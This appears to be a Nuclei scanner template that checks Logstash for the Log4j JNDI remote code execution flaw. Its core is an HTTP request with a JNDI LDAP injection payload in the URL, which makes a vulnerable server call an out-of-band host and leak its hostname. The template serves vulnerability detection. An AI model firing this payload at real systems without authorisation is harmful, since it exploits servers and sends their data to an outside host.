# Nuclei Template: Logstash - Remote Code Execution (Apache Log4j)
**Template ID:** logstash-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`logstash-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
Logstash is susceptible to Log4j JNDI remote code execution. Logstash is a free and open server-side data processing pipeline that ingests data from a multitude of sources, transforms it, and then sends it to your favorite "stash."

## Steps to reproduce / Exploit Payload
```http
GET /api/logstash/pipeline/${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}} HTTP/1.1
Host: {{Hostname}}
Referrer: {{RootURL}}/app/management/ingest/pipelines/
Content-Type: application/json
```

## References
- https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476
